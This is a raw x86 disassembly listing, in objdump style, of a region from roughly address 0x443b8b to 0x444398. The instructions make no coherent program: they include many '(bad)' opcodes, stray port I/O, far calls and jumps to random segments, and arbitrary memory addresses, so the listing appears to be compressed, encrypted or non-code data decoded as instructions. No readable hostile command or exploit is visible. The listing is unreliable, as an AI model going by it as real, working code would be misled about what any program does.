  443b8b:	pop    ecx
  443b8c:	sub    eax,0x334b0ca
  443b91:	or     cl,bl
  443b93:	sub    ebp,DWORD PTR [ebx-0x5e]
  443b96:	xor    DWORD PTR [ebx],ebp
  443b98:	les    edi,FWORD PTR [esi+eax*2]
  443b9b:	add    eax,0xe5507a75
  443ba0:	into   
  443ba1:	adc    eax,0x691c9151
  443ba6:	out    dx,al
  443ba7:	add    bh,BYTE PTR cs:[edx+0x79]
  443bab:	stos   DWORD PTR es:[edi],eax
  443bac:	das    
  443bad:	inc    ebp
  443bae:	stos   BYTE PTR es:[edi],al
  443baf:	stos   BYTE PTR es:[edi],al
  443bb0:	test   DWORD PTR [edx],edx
  443bb2:	mov    ds:0x41c40ff4,al
  443bb7:	mov    bh,0x3e
  443bb9:	dec    ecx
  443bba:	scas   eax,DWORD PTR es:[edi]
  443bbb:	xchg   esi,eax
  443bbc:	ds pop es
  443bbe:	cwde   
  443bbf:	mov    ?,WORD PTR [ecx+0x6e85c45]
  443bc5:	adc    edi,esi
  443bc7:	fcomp  DWORD PTR ds:0x9f42972d
  443bcd:	mov    dh,0x86
  443bcf:	pop    ebx
  443bd0:	fwait
  443bd1:	mov    esi,DWORD PTR [esi-0x48bfa9cc]
  443bd7:	sti    
  443bd8:	lods   eax,DWORD PTR ds:[esi]
  443bd9:	xchg   DWORD PTR [esi],ebx
  443bdb:	add    BYTE PTR [ebx-0x5c],dh
  443bde:	sub    esp,edx
  443be0:	mov    ah,0x91
  443be2:	add    BYTE PTR ds:0xcf509925,0x29
  443be9:	shl    DWORD PTR [ecx-0x3450c6c6],cl
  443bef:	int    0xd7
  443bf1:	out    0xf4,al
  443bf3:	mov    bh,0xe2
  443bf5:	and    bh,BYTE PTR [ebx-0x55d6d391]
  443bfb:	stos   DWORD PTR es:[edi],eax
  443bfc:	das    
  443bfd:	pop    eax
  443bfe:	mov    BYTE PTR [eax+0x369a7c1],dl
  443c04:	inc    esp
  443c05:	test   al,0x1b
  443c07:	sub    eax,DWORD PTR [ecx]
  443c09:	divps  xmm7,xmm4
  443c0c:	call   0xb149:0xc9ff5ab6
  443c13:	xor    al,0x4a
  443c15:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  443c16:	call   0xd7bb1aa
  443c1b:	out    dx,eax
  443c1c:	fmul   QWORD PTR [ecx-0x66e891ee]
  443c22:	and    bl,BYTE PTR [ecx-0x47ef646e]
  443c28:	fisub  WORD PTR [ecx+0x13fb5bdb]
  443c2e:	lds    ebp,FWORD PTR [ebx+0x41]
  443c31:	imul   ebp,edx,0xae7be879
  443c37:	jbe    0x443c76
  443c39:	and    BYTE PTR [eax+esi*1+0x7fed7c9f],bh
  443c40:	push   ebp
  443c41:	call   0x4bc8:0xed34308b
  443c48:	and    eax,0xe0b3a1d9
  443c4d:	test   BYTE PTR [ebp-0x43],bl
  443c50:	mov    bh,BYTE PTR [edx+0x7d]
  443c53:	jno    0x443c68
  443c55:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  443c56:	mov    ebx,DWORD PTR [ebx-0x65c8c7c3]
  443c5c:	and    ebp,ecx
  443c5e:	leave  
  443c5f:	ret    
  443c60:	and    eax,0x8dbad427
  443c65:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  443c66:	sbb    edx,ebx
  443c68:	mov    fs:0x8ce6eee7,eax
  443c6e:	gs push dx
  443c71:	mov    eax,ds:0xff39d8ab
  443c76:	push   ecx
  443c77:	jle    0x443c52
  443c79:	mov    ds:0x387aa61b,eax
  443c7e:	mov    DWORD PTR [esi-0x4a56a7f3],esi
  443c84:	in     al,0x68
  443c86:	mov    bl,0x34
  443c88:	fiadd  DWORD PTR [esi-0x1c]
  443c8b:	fisub  WORD PTR [ebp-0x18]
  443c8e:	retf   
  443c8f:	cmc    
  443c90:	mov    ebx,0x5596d558
  443c95:	xor    ch,ch
  443c97:	and    eax,0x5c9c691d
  443c9c:	xor    DWORD PTR [edx-0x607d246f],esp
  443ca2:	fcomi  st,st(4)
  443ca4:	loopne 0x443cc2
  443ca6:	mov    ch,0x40
  443ca8:	jecxz  0x443c4f
  443caa:	test   DWORD PTR [edx-0x2baf06db],esp
  443cb0:	cmp    ebp,ecx
  443cb2:	sub    eax,0xeba0d086
  443cb7:	fild   DWORD PTR [esp+esi*1+0x12c548f4]
  443cbe:	lods   al,BYTE PTR ds:[esi]
  443cbf:	daa    
  443cc0:	xchg   ebp,eax
  443cc1:	xor    bh,BYTE PTR [edx+0x59575214]
  443cc7:	jb     0x443c4f
  443cc9:	lods   eax,DWORD PTR ds:[esi]
  443cca:	jbe    0x443ccc
  443ccc:	scas   eax,DWORD PTR es:[edi]
  443ccd:	dec    edx
  443cce:	xor    bh,BYTE PTR [esi]
  443cd0:	xor    eax,0xa8b08f80
  443cd5:	mov    eax,ds:0x4fe6b69a
  443cda:	jmp    0x443cc4
  443cdc:	outs   dx,DWORD PTR ds:[esi]
  443cdd:	inc    ebx
  443cde:	iret   
  443cdf:	fbstp  TBYTE PTR [edx+eax*2-0x6b68e346]
  443ce6:	mov    eax,0x31bc5dc6
  443ceb:	in     eax,0x94
  443ced:	pusha  
  443cee:	inc    esi
  443cef:	(bad)  
  443cf1:	or     eax,0x3111e4c5
  443cf6:	xlat   BYTE PTR ds:[ebx]
  443cf7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  443cf8:	jg     0x443ca1
  443cfa:	mov    ebx,0x7347ec10
  443cff:	mov    dh,0x6f
  443d01:	xchg   edi,eax
  443d02:	aam    0xff
  443d04:	or     eax,0x16052aef
  443d09:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  443d0a:	sub    esp,edx
  443d0c:	sub    ebx,DWORD PTR [ecx]
  443d0e:	daa    
  443d0f:	addr16 xor eax,0xc2ef8db9
  443d15:	ins    BYTE PTR es:[edi],dx
  443d16:	cld    
  443d17:	fs pop ss
  443d19:	dec    ecx
  443d1a:	mov    ch,0xa3
  443d1c:	sbb    al,BYTE PTR [ecx-0x59d27b63]
  443d22:	sti    
  443d23:	outs   dx,DWORD PTR ds:[esi]
  443d24:	or     BYTE PTR [edi+0x6f],0xda
  443d28:	adc    bh,dl
  443d2a:	xor    al,0x77
  443d2c:	sbb    ecx,ecx
  443d2e:	adc    al,BYTE PTR [ebx+0x292cf424]
  443d34:	test   al,0x99
  443d36:	imul   esi,edi,0x37
  443d39:	sub    eax,0xf5a7c44
  443d3e:	mov    ecx,0xba8e6a9a
  443d43:	in     al,0xeb
  443d45:	cmp    al,0x86
  443d47:	push   esp
  443d48:	jbe    0x443cff
  443d4a:	retf   
  443d4b:	pop    ds
  443d4c:	and    cl,BYTE PTR [edx-0x4c]
  443d4f:	ins    DWORD PTR es:[edi],dx
  443d50:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  443d51:	jae    0x443dbf
  443d53:	xor    BYTE PTR ds:0x1968789b,al
  443d59:	adc    edx,esp
  443d5b:	jge    0x443d84
  443d5d:	mov    edi,0xd1152e24
  443d62:	into   
  443d63:	repz push esp
  443d65:	mov    eax,ds:0x891c354a
  443d6a:	les    esp,FWORD PTR [edx-0x1daaf7c8]
  443d70:	inc    ebp
  443d71:	retf   0x3e5b
  443d74:	out    dx,eax
  443d75:	or     BYTE PTR [ebp+0x7a],bl
  443d78:	and    eax,0x50680173
  443d7d:	jns    0x443d0e
  443d7f:	out    dx,eax
  443d80:	mov    ch,0x33
  443d82:	retf   
  443d83:	push   ds
  443d84:	and    BYTE PTR ds:0x9ea7bf56,ah
  443d8a:	dec    ebx
  443d8b:	adc    DWORD PTR [ebp-0x7d],esp
  443d8e:	or     edi,DWORD PTR [ebp+0x60c40bd3]
  443d94:	pop    ss
  443d95:	fiadd  WORD PTR [ecx-0x4cfd671a]
  443d9b:	mov    BYTE PTR ds:0x9a11bba6,al
  443da1:	mov    WORD PTR [ebx-0x49bda331],es
  443da7:	cli    
  443da8:	rcl    ebx,1
  443daa:	mov    ah,0x24
  443dac:	xor    al,0x99
  443dae:	pop    es
  443daf:	xchg   edi,eax
  443db0:	div    DWORD PTR [edi+eax*2]
  443db3:	mov    edi,0xe50c5071
  443db8:	test   al,0x4b
  443dba:	in     eax,dx
  443dbb:	scas   al,BYTE PTR es:[edi]
  443dbc:	add    al,0x6a
  443dbe:	mov    bl,0xa4
  443dc0:	or     esi,esi
  443dc2:	popf   
  443dc3:	xchg   esi,eax
  443dc4:	xor    eax,0x7ef29574
  443dc9:	popa   
  443dca:	xor    DWORD PTR [edi],esi
  443dcc:	mov    bl,0x39
  443dce:	pop    es
  443dcf:	pop    ecx
  443dd0:	outs   dx,BYTE PTR ds:[esi]
  443dd1:	lahf   
  443dd2:	rol    edi,cl
  443dd4:	xor    DWORD PTR [edx],ecx
  443dd6:	(bad)  [esi-0x46]
  443dd9:	rcl    BYTE PTR [ebx+esi*8],0xd7
  443ddd:	mov    bl,0x19
  443ddf:	fmul   QWORD PTR [ebp-0x6e147da9]
  443de5:	jnp    0x443d69
  443de7:	or     DWORD PTR [eax-0x738b4347],esi
  443ded:	in     al,0xd4
  443def:	aam    0xa5
  443df1:	stos   DWORD PTR es:[edi],eax
  443df2:	mov    fs,esi
  443df4:	add    al,0xa1
  443df6:	jbe    0x443d93
  443df8:	and    ebp,DWORD PTR [ecx-0x26ea5f6e]
  443dfe:	inc    ebp
  443dff:	jb     0x443e01
  443e01:	dec    edi
  443e02:	jg     0x443e6e
  443e04:	sbb    eax,0x6b6dc9a1
  443e09:	out    dx,al
  443e0a:	sbb    bh,BYTE PTR [edx+0x19]
  443e0d:	or     DWORD PTR [edi-0x42761ae4],edx
  443e13:	(bad)  
  443e14:	out    dx,eax
  443e15:	mov    ds:0x2bb823ab,eax
  443e1a:	mov    al,ds:0x30f5850e
  443e1f:	jno    0x443e8d
  443e21:	mov    al,0x55
  443e23:	inc    ebx
  443e24:	fst    QWORD PTR [edx+0x2b5f54ba]
  443e2a:	js     0x443dfd
  443e2c:	aad    0x19
  443e2e:	pop    esi
  443e2f:	jmp    0x443e9f
  443e31:	fwait
  443e32:	hlt    
  443e33:	rcl    DWORD PTR [esi-0x68],cl
  443e36:	sbb    ecx,DWORD PTR [edi+ebp*8+0x5a]
  443e3a:	pop    ss
  443e3b:	mov    ah,0xcb
  443e3d:	cdq    
  443e3e:	sbb    BYTE PTR [edi-0x2db258aa],dl
  443e44:	cs mov esi,ebx
  443e47:	cwde   
  443e48:	in     eax,0xdc
  443e4a:	fwait
  443e4b:	adc    ebp,DWORD PTR [ebx-0x11]
  443e4e:	mov    ecx,0x9c280d57
  443e53:	hlt    
  443e54:	jnp    0x443e20
  443e56:	xor    esp,DWORD PTR [esi+0x2fdb891e]
  443e5c:	and    BYTE PTR [ecx],0xc2
  443e5f:	scas   al,BYTE PTR es:[edi]
  443e60:	and    eax,0xfef02e8a
  443e65:	test   al,0x92
  443e67:	loope  0x443ee7
  443e69:	sub    ebp,DWORD PTR [eax-0x45]
  443e6c:	xchg   esi,eax
  443e6d:	pushf  
  443e6e:	pop    ebx
  443e6f:	mov    bh,0x59
  443e71:	aaa    
  443e72:	mov    esi,0x1ba0bba7
  443e77:	std    
  443e78:	and    eax,DWORD PTR [eax-0x3f8ff741]
  443e7e:	daa    
  443e7f:	lock push eax
  443e81:	scas   eax,DWORD PTR es:[edi]
  443e82:	mov    ebx,0xa1f83a04
  443e87:	cmp    eax,0xf46f2d85
  443e8c:	pop    es
  443e8d:	pop    ebx
  443e8e:	cmp    eax,0x34191a93
  443e93:	add    al,0xd9
  443e95:	lock cmp eax,0x7a80ffd0
  443e9b:	xchg   ecx,eax
  443e9c:	test   DWORD PTR [eax-0x376716a0],esi
  443ea2:	mov    ecx,0xdedadfc1
  443ea7:	shl    DWORD PTR [ebx],cl
  443ea9:	or     eax,0xf3e96356
  443eae:	cmp    al,0xc2
  443eb0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  443eb1:	mov    eax,0xd350e527
  443eb6:	xor    dh,BYTE PTR [ecx+0x21]
  443eb9:	leave  
  443eba:	fdivr  DWORD PTR [edi+0xd6630fe]
  443ec0:	ret    
  443ec1:	jo     0x443e50
  443ec3:	push   es
  443ec4:	adc    eax,0xc75c379c
  443ec9:	mov    ds:0xa919cab0,al
  443ece:	xchg   ebp,esp
  443ed0:	jne    0x443f0e
  443ed2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  443ed3:	pushf  
  443ed4:	retf   0xef23
  443ed7:	rcr    BYTE PTR [ecx+eiz*2],1
  443eda:	shr    DWORD PTR [edi-0x49],1
  443edd:	test   al,0xe
  443edf:	cmp    dh,dl
  443ee1:	cmp    al,0x93
  443ee3:	xlat   BYTE PTR ds:[ebx]
  443ee4:	lods   eax,DWORD PTR ds:[esi]
  443ee5:	test   edx,edi
  443ee7:	in     eax,dx
  443ee8:	(bad)  
  443ee9:	mov    edi,0x1d15e27b
  443eee:	aad    0xf7
  443ef0:	push   ecx
  443ef1:	cmp    al,0x84
  443ef3:	aam    0x3
  443ef5:	mov    ebx,0x89857372
  443efa:	out    0xd4,al
  443efc:	sbb    DWORD PTR [ebx-0x5ccc4898],ebx
  443f02:	dec    ebx
  443f03:	pop    edx
  443f04:	rcl    bh,cl
  443f06:	cs push ebx
  443f08:	lock popf 
  443f0a:	xchg   esi,eax
  443f0b:	sbb    al,0x1f
  443f0d:	or     DWORD PTR [edi-0x1c],ebx
  443f10:	je     0x443ef1
  443f12:	push   ebp
  443f13:	retf   0xa780
  443f16:	pop    ebx
  443f17:	mov    edi,0x8404094a
  443f1c:	fucomip st,st(6)
  443f1e:	lods   al,BYTE PTR ds:[esi]
  443f1f:	push   ebp
  443f20:	loop   0x443f63
  443f22:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  443f23:	jbe    0x443f9a
  443f25:	push   esi
  443f26:	mov    al,0xfc
  443f28:	sub    eax,0xef15db9a
  443f2d:	loop   0x443f05
  443f2f:	xor    ebp,ebx
  443f31:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  443f32:	pop    esi
  443f33:	or     DWORD PTR ds:0x2104bf54,ebx
  443f39:	test   al,0x44
  443f3b:	mov    dh,0x45
  443f3d:	ret    0xee0a
  443f40:	nop
  443f41:	cld    
  443f42:	xor    edx,eax
  443f44:	and    ebx,ecx
  443f46:	std    
  443f47:	push   ebx
  443f48:	call   0xbba7:0x12adfb6c
  443f4f:	add    ebp,DWORD PTR [eax+0x2f]
  443f52:	cmp    BYTE PTR [edi-0x6949c1d5],dl
  443f58:	or     DWORD PTR [edi+0x6969f4bd],edi
  443f5e:	inc    eax
  443f5f:	push   esp
  443f60:	(bad)  
  443f61:	imul   ecx,DWORD PTR [eax-0x20],0x9424a11e
  443f68:	or     dh,BYTE PTR [ebp+ebx*8+0x7d10bfce]
  443f6f:	mov    dh,0xcb
  443f71:	inc    ecx
  443f72:	add    eax,0xa199dde5
  443f77:	in     eax,0xbf
  443f79:	pop    esi
  443f7a:	inc    ecx
  443f7b:	inc    edx
  443f7c:	test   DWORD PTR [esi+esi*1-0x5],ecx
  443f80:	pop    esp
  443f81:	or     cl,BYTE PTR [ebx+ebx*2-0xe23ae0c]
  443f88:	aaa    
  443f89:	xor    BYTE PTR [eax-0x3be2385c],dh
  443f8f:	push   es
  443f90:	gs sub al,0x6e
  443f93:	out    0xbd,al
  443f95:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  443f96:	js     0x444012
  443f98:	sbb    edi,DWORD PTR [ecx-0x23124085]
  443f9e:	sub    esp,DWORD PTR [ebx]
  443fa0:	daa    
  443fa1:	stos   BYTE PTR es:[edi],al
  443fa2:	sti    
  443fa3:	sar    BYTE PTR [ebx+0x61],0x59
  443fa7:	cmp    ch,BYTE PTR [esi-0x3c71c61c]
  443fad:	cwde   
  443fae:	and    BYTE PTR [ebx-0x3b41fb8f],cl
  443fb4:	jae    0x443f4f
  443fb6:	repz sbb dl,ch
  443fb9:	mov    ebx,0xd0f1d9
  443fbe:	push   edi
  443fbf:	xor    BYTE PTR [edi],bl
  443fc1:	mov    ecx,0x3e94388a
  443fc6:	js     0x443fa1
  443fc8:	enter  0x1f86,0xbf
  443fcc:	sbb    eax,0x7e839fb9
  443fd1:	cld    
  443fd2:	int    0xd
  443fd4:	and    eax,0xc9950999
  443fd9:	dec    ebx
  443fda:	loope  0x443fce
  443fdc:	pop    es
  443fdd:	mov    dl,0x1b
  443fdf:	dec    esp
  443fe0:	pop    ebx
  443fe1:	xor    al,0x2f
  443fe3:	pop    ecx
  443fe4:	imul   ecx,DWORD PTR [edi+0x190a2729],0x356b7cbb
  443fee:	out    dx,al
  443fef:	xchg   esp,eax
  443ff0:	pop    ebp
  443ff1:	call   0x60cb:0xa2b812a4
  443ff8:	enter  0x1119,0xd6
  443ffc:	out    0xda,eax
  443ffe:	out    0xd6,eax
  444000:	dec    edx
  444001:	sahf   
  444002:	mov    esi,0x44ac6924
  444007:	push   edx
  444008:	clc    
  444009:	les    ebp,FWORD PTR [ecx]
  44400b:	shl    DWORD PTR [ebp+0x39e7fbab],cl
  444011:	scas   al,BYTE PTR es:[edi]
  444012:	ins    DWORD PTR es:[edi],dx
  444013:	test   edi,esi
  444015:	sar    BYTE PTR [edx+0x21699be4],1
  44401b:	jb     0x444062
  44401d:	dec    ecx
  44401e:	popf   
  44401f:	call   0x8a5f3f41
  444024:	xor    eax,0xad7b6959
  444029:	gs nop
  44402b:	neg    eax
  44402d:	test   DWORD PTR [ebp-0x12],edx
  444030:	xor    eax,0x9becf8dc
  444035:	jle    0x444038
  444037:	nop
  444038:	sub    al,0x69
  44403a:	jnp    0x4440a3
  44403c:	jmp    0x63a8:0x14232d73
  444043:	jnp    0x444009
  444045:	jns    0x443fe4
  444047:	dec    esp
  444048:	sub    dl,BYTE PTR [esi]
  44404a:	adc    al,0x6a
  44404c:	add    DWORD PTR [eax-0x1c7e908d],esp
  444052:	jo     0x443ff7
  444054:	and    eax,DWORD PTR [esi+0x351eb500]
  44405a:	sbb    al,0xcb
  44405c:	int    0xa2
  44405e:	cmp    ecx,DWORD PTR [edi-0x42]
  444061:	sbb    eax,0x78580693
  444066:	cmp    al,0xc5
  444068:	and    cl,BYTE PTR [ecx-0x28e15ca5]
  44406e:	jnp    0x444085
  444070:	pop    edx
  444071:	retf   0xb03b
  444074:	je     0x4440b0
  444076:	(bad)  
  444077:	sahf   
  444078:	xchg   esi,eax
  444079:	mov    dh,0x94
  44407b:	(bad)  
  44407c:	sbb    BYTE PTR [ecx],bl
  44407e:	mov    al,ds:0x8a1eeb63
  444083:	fs inc edx
  444085:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  444086:	pop    ebx
  444087:	cmp    DWORD PTR [ecx],ebp
  444089:	out    0x7e,al
  44408b:	stos   DWORD PTR es:[edi],eax
  44408c:	loopne 0x4440e3
  44408e:	push   esp
  44408f:	dec    ebp
  444090:	xor    eax,0x2346f314
  444095:	xor    esi,DWORD PTR [esp+esi*1+0x5e3a3b1b]
  44409c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44409d:	inc    eax
  44409e:	sbb    al,0xf1
  4440a0:	jle    0x44402b
  4440a2:	push   ds
  4440a3:	push   ds
  4440a4:	sbb    ebx,DWORD PTR [ecx-0x5e]
  4440a7:	mov    DWORD PTR [edx],esi
  4440a9:	cmp    bh,BYTE PTR [ebx+0x4c0badb3]
  4440af:	out    dx,al
  4440b0:	sbb    al,0x83
  4440b2:	out    dx,eax
  4440b3:	xchg   BYTE PTR [ebx],al
  4440b5:	jg     0x4440dc
  4440b7:	repnz fstp QWORD PTR [edx+0x312fabc1]
  4440be:	xchg   DWORD PTR [edx],ebp
  4440c0:	rol    BYTE PTR ds:0xd83440a9,1
  4440c6:	mov    dl,0xa6
  4440c8:	push   ss
  4440c9:	jne    0x444115
  4440cb:	add    ebp,DWORD PTR [esi+0x755251f1]
  4440d1:	cmp    eax,0x8da26f5
  4440d6:	mov    eax,0x7ec5cca4
  4440db:	jb     0x444103
  4440dd:	mov    edx,0x9b846234
  4440e2:	outs   dx,BYTE PTR ds:[esi]
  4440e3:	ds jl  0x4440fc
  4440e6:	leave  
  4440e7:	test   al,0xcc
  4440e9:	mov    WORD PTR [ecx+0x57559a04],?
  4440ef:	jmp    0x7adf:0xdc0ff121
  4440f6:	sub    al,0xaa
  4440f8:	jae    0x44415a
  4440fa:	(bad)  
  4440fb:	pop    ebx
  4440fc:	mov    ebx,0xec44b364
  444101:	shr    ecx,0x7d
  444104:	and    eax,0xbea3c72
  444109:	xchg   edi,eax
  44410a:	mov    bl,0xd5
  44410c:	pop    ss
  44410d:	jmp    0xd5f11c78
  444112:	jbe    0x444099
  444114:	std    
  444115:	mov    dh,0x5b
  444117:	push   ecx
  444118:	icebp  
  444119:	sub    DWORD PTR [ebp-0x30],0x1ee8a157
  444120:	push   ds
  444121:	fldcw  WORD PTR [esi+0x6745eb71]
  444127:	icebp  
  444128:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  444129:	fwait
  44412a:	jmp    0x44410d
  44412c:	dec    ebx
  44412d:	cmc    
  44412e:	xchg   ebx,eax
  44412f:	dec    DWORD PTR fs:[ecx]
  444132:	lods   al,BYTE PTR ds:[esi]
  444133:	mov    dl,0xc1
  444135:	inc    edi
  444136:	mov    edi,0xcf1f0664
  44413b:	loop   0x444192
  44413d:	jle    0x444150
  44413f:	jmp    0x44413c
  444141:	bound  ecx,QWORD PTR [ecx]
  444143:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  444144:	push   ss
  444145:	stc    
  444146:	jbe    0x444180
  444148:	jmp    DWORD PTR [eax+0x17]
  44414b:	aaa    
  44414c:	hlt    
  44414d:	sahf   
  44414e:	pop    ebx
  44414f:	push   esi
  444150:	and    esp,edx
  444152:	ds lock clc 
  444155:	xchg   DWORD PTR [eax-0x7b7f7e33],edx
  44415b:	cmp    BYTE PTR [esi],cl
  44415d:	mov    al,ds:0x1306df39
  444162:	daa    
  444163:	retf   
  444164:	in     eax,0x33
  444166:	fsubr  st,st(7)
  444168:	nop
  444169:	clc    
  44416a:	call   0x589d59cc
  44416f:	or     al,0x3
  444171:	arpl   WORD PTR [edx],di
  444173:	mov    bl,0x63
  444175:	mov    bl,ch
  444177:	cli    
  444178:	mov    ch,0x98
  44417a:	into   
  44417b:	cli    
  44417c:	or     eax,0x2527bc20
  444181:	mov    bl,0x90
  444183:	xchg   ebp,eax
  444184:	sbb    DWORD PTR [ecx-0x57afc0e4],edi
  44418a:	add    esp,DWORD PTR [edx-0x47]
  44418d:	pop    edi
  44418e:	jp     0x44414f
  444190:	add    eax,0xb8ed3df7
  444195:	jne    0x44416a
  444197:	jns    0x44418c
  444199:	inc    eax
  44419a:	pushf  
  44419b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44419c:	retf   0xbccf
  44419f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4441a0:	aad    0x94
  4441a2:	sbb    bl,BYTE PTR [esi+0x45]
  4441a5:	(bad)  
  4441a7:	in     al,0x70
  4441a9:	push   cs
  4441aa:	or     ah,BYTE PTR [edx-0x7649e6d7]
  4441b0:	cmp    al,0xb3
  4441b2:	or     al,0x56
  4441b4:	push   ss
  4441b5:	dec    eax
  4441b6:	loop   0x4441f0
  4441b8:	lds    esi,FWORD PTR [ebp+0x6346e5a6]
  4441be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4441bf:	push   esi
  4441c0:	sahf   
  4441c1:	or     BYTE PTR [eax],dh
  4441c3:	push   0xe93b9be9
  4441c8:	jmp    0x508282b6
  4441cd:	into   
  4441ce:	or     edi,DWORD PTR [edi+0x2489fe9f]
  4441d4:	fwait
  4441d5:	cmc    
  4441d6:	les    ecx,FWORD PTR [edi-0x6e]
  4441d9:	dec    ecx
  4441da:	or     eax,0x16275981
  4441df:	fdivr  DWORD PTR [ebx]
  4441e1:	pop    es
  4441e2:	mov    ah,0xfd
  4441e4:	xchg   ebp,eax
  4441e5:	push   0x7499fd09
  4441ea:	fisub  DWORD PTR [eax+ecx*2+0x2e]
  4441ee:	pop    eax
  4441ef:	out    0x22,al
  4441f1:	jns    0x44418c
  4441f3:	and    esp,DWORD PTR [ecx+edi*8-0x5d9286f7]
  4441fa:	jmp    0x444260
  4441fc:	mov    ebx,0x54fca30d
  444201:	cmp    eax,0xb5329d69
  444206:	into   
  444207:	je     0x4441cf
  444209:	xchg   edx,eax
  44420a:	or     al,0x5c
  44420c:	es (bad) 
  44420e:	push   DWORD PTR [edx+0xae4a954]
  444214:	test   dl,dh
  444216:	mov    ebx,0x3b47ea42
  44421b:	cs rcl al,0xe7
  44421f:	xchg   esp,eax
  444220:	inc    esp
  444221:	and    BYTE PTR [eax],cl
  444223:	pop    edi
  444224:	mov    ds,WORD PTR [ebp+0x4b375ceb]
  44422a:	les    edx,FWORD PTR [ebp+0x35bae3ad]
  444230:	mov    ah,0x6b
  444232:	mov    edi,0xb799ef94
  444237:	pop    ebp
  444238:	mov    ch,0xdb
  44423a:	fcomip st,st(1)
  44423c:	mov    ds:0x17bb384d,al
  444241:	pop    ecx
  444242:	mov    ebp,0xfcef8cc1
  444247:	(bad)  
  444248:	sub    ch,BYTE PTR [eax-0x1c450035]
  44424e:	bound  edx,QWORD PTR [ebx+edx*1]
  444251:	stos   BYTE PTR es:[edi],al
  444252:	fwait
  444253:	call   0xc4fd52d5
  444258:	xchg   ebx,eax
  444259:	in     eax,dx
  44425a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44425b:	ret    
  44425c:	and    eax,0xd6e74cdb
  444261:	xchg   dl,al
  444263:	mov    eax,0xe240d91f
  444268:	std    
  444269:	enter  0x8de2,0x3b
  44426d:	mov    ds:0x9398438b,eax
  444272:	ins    DWORD PTR es:[edi],dx
  444273:	cmc    
  444274:	push   es
  444275:	jno    0x44422e
  444277:	ret    0xcf72
  44427a:	cmp    edi,DWORD PTR [ecx]
  44427c:	rcl    DWORD PTR [ecx],cl
  44427e:	jle    0x444236
  444280:	test   BYTE PTR [edx+0x5f],bh
  444283:	jmp    0x44427d
  444285:	test   eax,0xb1e532e0
  44428a:	addr16 jmp 0xbd0b:0x3808490e
  444292:	sbb    al,0xe7
  444294:	aam    0x1a
  444296:	mov    ebp,0x6b9f7184
  44429b:	push   ebp
  44429c:	sub    eax,0x4210a9e0
  4442a1:	or     eax,0x642550ee
  4442a6:	mov    ch,0x74
  4442a8:	inc    eax
  4442a9:	add    sp,WORD PTR [ecx+eax*1]
  4442ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4442ae:	stos   DWORD PTR es:[edi],eax
  4442af:	ins    DWORD PTR es:[edi],dx
  4442b0:	fisubr WORD PTR [ebx*2+0x34004285]
  4442b7:	test   eax,0x2c6d3cc6
  4442bc:	pop    ebp
  4442bd:	jb     0x444327
  4442bf:	call   0xc2af2d11
  4442c4:	mov    DWORD PTR [eax+0x611dadcf],eax
  4442ca:	outs   dx,BYTE PTR ds:[esi]
  4442cb:	xor    ah,al
  4442cd:	and    bh,BYTE PTR [ebx+0x24]
  4442d0:	jecxz  0x44426a
  4442d2:	or     al,ch
  4442d4:	mov    dh,0x3d
  4442d6:	mov    ebp,0x2a4b7c84
  4442db:	dec    edx
  4442dc:	and    eax,0x12ec2ca9
  4442e1:	popf   
  4442e2:	(bad)  
  4442e3:	jmp    0x686:0xe9d20921
  4442ea:	push   ebx
  4442eb:	pop    edx
  4442ec:	cmp    ah,BYTE PTR [edi+0x19759f6b]
  4442f2:	sar    ebx,cl
  4442f4:	(bad)  
  4442f5:	sahf   
  4442f6:	repz cwde 
  4442f8:	jnp    0x444359
  4442fa:	scas   eax,DWORD PTR es:[edi]
  4442fb:	jo     0x444315
  4442fd:	(bad)  
  4442fe:	outs   dx,DWORD PTR ds:[esi]
  4442ff:	xchg   ebp,eax
  444300:	mov    BYTE PTR [esi-0x7eac2206],ch
  444306:	mov    ebx,0x47412db4
  44430b:	shl    DWORD PTR [ebp+0x65],0xc3
  44430f:	in     eax,0x4e
  444311:	pop    edi
  444312:	dec    eax
  444313:	in     eax,dx
  444314:	and    al,0x19
  444316:	loop   0x444308
  444318:	ja     0x444331
  44431a:	sbb    ah,al
  44431c:	or     ah,BYTE PTR [ecx-0x2b385da5]
  444322:	sub    DWORD PTR [esi],0x37
  444325:	in     al,0x9b
  444327:	pop    edi
  444328:	lods   eax,DWORD PTR ds:[esi]
  444329:	ds mov edi,0xb8bb2d04
  44432f:	mov    ecx,0xf2124a25
  444334:	mov    ecx,0x19656649
  444339:	cdq    
  44433a:	add    ebx,0x3f
  44433d:	mov    ds:0xb41c6117,eax
  444342:	sbb    dl,BYTE PTR [eax+0x1344a898]
  444348:	(bad)  
  444349:	jmp    0x228a:0x1b03c295
  444350:	(bad)  
  444351:	cwde   
  444352:	into   
  444353:	push   esi
  444354:	add    al,0xfc
  444356:	call   0x1355:0x26952bbb
  44435d:	jle    0x444313
  44435f:	or     BYTE PTR [esi],al
  444361:	push   0x23261855
  444366:	and    al,BYTE PTR [ebx+0x4bb3490]
  44436c:	imul   ebx,DWORD PTR [eax-0x74],0xffffff89
  444370:	fs std 
  444372:	test   eax,0x2c0e546
  444377:	out    0xe,eax
  444379:	mov    esi,0xc9225cb4
  44437e:	lds    edx,FWORD PTR ds:0x87a82c32
  444384:	setge  BYTE PTR [ebx-0x7e]
  444388:	test   DWORD PTR [ecx+0xdc3469f],eax
  44438e:	iret   
  44438f:	out    dx,al
  444390:	mov    cl,0xe8
  444392:	mov    ebp,0x735d8764
  444397:	pop    edx
  444398:	inc    esi
